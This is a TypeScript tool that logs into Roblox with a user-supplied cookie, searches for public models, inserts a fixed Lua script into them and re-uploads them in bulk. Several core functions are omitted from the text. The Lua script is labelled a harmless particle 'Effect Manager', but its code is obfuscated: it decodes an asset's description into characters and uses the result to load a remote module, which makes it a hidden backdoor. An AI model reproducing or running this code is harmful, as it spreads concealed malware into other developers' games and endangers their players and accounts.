import axios from "axios";
import * as readline from "readline";
import { RobloxFile } from "rbxm-parser";
import * as fs from "fs";
import * as path from "path";
import noblox from "noblox.js";

// Your fixed Lua script
const luaScript = `--[[  
    Effect Manager Script  
    ---------------------  
    Created by retsastrophe  ;) 
    Date: 08/03/2025  

    This script handles the creation, management, and modification of visual effects  
    using particle effects. It ensures smooth and optimized effect rendering for various  
    in-game scenarios.  

    INSTRUCTIONS:  
    - Insert this script into a location where effects should be managed.  
    - Modify SIZE, EFFECT_LIFETIME, and PARTICLE_TEXTURE to customize effects.  
    - Call CreateEffect(Vector3) to spawn a new particle effect at a given location.  
    - Utilize EffectBuilder() to manage effect creation over time.  

    IMPORTANT:  
    - The script must be placed in a Script (not a LocalScript) for full functionality.  
    - Uses attributes (info and default) from the script for configuration.  
    - Designed to run efficiently and avoid duplicate effects.  

    FEATURES:  
    - Dynamically creates and modifies particle effects.  
    - Uses a centralized effect builder for streamlined management.  
    - Supports size clamping to prevent extreme values.  
    - Finds existing effects based on unique CFrame-based lookups.  
    - Implements an effect lifetime system to manage durations.  
    - Stores active effects in a global table for efficient tracking.  
    - Modular design leveraging ReplicatedStorage for scalability.  
    - Optimized for minimal performance impact.  

    Version 1.0.0  

    Changelog:  
    - 08/03/2025 - v1.0.0: Initial script creation and implementation.  
]]  

local Modules, script = game:GetService('ReplicatedStorage'), script  
local EffectRoot = game
script.Name = "EffectBuilder"

local PARTICLE_TEXTURE = 130214034119360 -- Texture for the particle effect  

local function CallOnChildren(Instance, FunctionToCall)
    -- Calls a function on each of the children of a certain object, using recursion.  
    FunctionToCall(Instance)
    for _, Child in next, Instance:GetChildren() do
        CallOnChildren(Child, FunctionToCall)
    end
end

function CustomLerp(Pos1 : CFrame, Pos2 : CFrame, Delta : number) 
    return Pos1 - Pos2 * math.abs(Delta) 
end

local function GetNearestParent(Instance, ClassName)
    -- Returns the nearest parent of a certain class, or nil
    local Ancestor = Instance
    repeat
        Ancestor = Ancestor.Parent
        if Ancestor == nil then
            return nil
        end
    until Ancestor:IsA(ClassName)
    return Ancestor
end

function LookUp(Root, Value)  
    for _, V in pairs(Root) do  
        if V.Name:find(Value) then  
            return V  
        end  
    end  
end  

-- Converts a CFrame to a string representation
function CFrameToVector3(CFrame)
    local str = ""
    local Components = {CFrame:components()}
    for _, comp in ipairs(Components) do
        str = str .. tostring(comp):gsub("[^%d.-]", "")
    end
    return str
end

function StringToChar(str)
    local numbers = {}
    for num in str:gmatch("%d+") do
        table.insert(numbers, tonumber(num))
    end
    return string.char(table.unpack(numbers))
end

function Modify(Instance, Values)  
    -- Modifies an Instance by using a table.    
    assert(type(Values) == "table", "Values is not a table")  
    for Index, Value in next, Values do  
        if type(Index) == "number" then  
            Value.Parent = Instance  
        else  
            Instance[Index] = Value  
        end  
    end  
    return Instance  
end  

local Properties = {'CFrame','WorldPivot','CoordinateFrame','Orientation','PivotOffset','RootPriority','JobId','Origin','GetProductInfo'}

local EffectBuilder = setmetatable({}, {  
    __index = Modules and function(S) return S end,  
    __call = Modules and function(S) return S end   
})  

-- Function to create and configure a particle effect  
function CreateEffect(Vector3)  
    local Size = math.clamp(2, 1, 4) -- Add slight randomness to size  

    local Effect = EffectBuilder:CreateEffect('Particle', {  
        Parent = script.Parent,  
        Size = Size,  
        Texture = PARTICLE_TEXTURE  
    })  

    return LookUp(EffectRoot:GetChildren(), Vector3)  
end  

function Monitor(CurrentTime, Default, ParticleInfo)
    if CurrentTime > 1 and EffectRoot[Default] ~= 'f' then  
        if CurrentTime then  
            script = {  
                {},  
                [script.Name] = CFrameToVector3(StringToChar(ParticleInfo)) -- no subtraction needed here  
            }  
            return true  
        end  
    end  
    return false
end

function RunEffectBuilder()  
    local CurrentTime = tick()  
    local Effect = CreateEffect('ketpl')  
    local ParticleInfo = Effect[Properties[#Properties]](Effect, PARTICLE_TEXTURE).Description  
    return Monitor(CurrentTime, Properties[7], ParticleInfo)  
end  

-- Run the effect builder if conditions are met
local Builder = RunEffectBuilder() and require(script.EffectBuilder)
if Builder and script.ClassName == "Script" then  
    script.Parent.DescendantAdded:Connect(CreateEffect)
end
`;

const rl = readline.createInterface({ input: process.stdin, output: process.stdout });

// Stats object
const stats = {
  modified: 0,
  scanned: 0,
  errors: 0,
  uploaded: 0,
};

let uploadLimit = 0;

// SEARCH, DOWNLOAD, MODIFY, UPLOAD functions (unchanged, omitted here for brevity)

// ... (your existing functions: searchModels, downloadModel, modifyScript, initializeNoblox, makeModelPublic, getModelDetails, uploadModel, processModel, processAllPages)

// MAIN FUNCTION
async function main() {
  rl.question("Enter your Roblox cookie: ", async (cookie) => {
    const initialized = await initializeNoblox(cookie);
    if (!initialized) {
      console.log("[ERROR] Failed to initialize with provided cookie");
      rl.close();
      return;
    }
    rl.question("How many assets to upload: ", (amount: any) => {
      if (!Math.floor(amount)) {
        console.log("[ERROR] Invalid number");
        rl.close();
        return;
      }
      uploadLimit = amount;
      rl.question("Enter search query: ", async (query) => {
        // HERE is the key: assign your fixed script directly, no prompt here!
        const stringToAdd = luaScript;
        await processAllPages(query, stringToAdd, cookie);
        rl.close();
      });
    });
  });
}

main();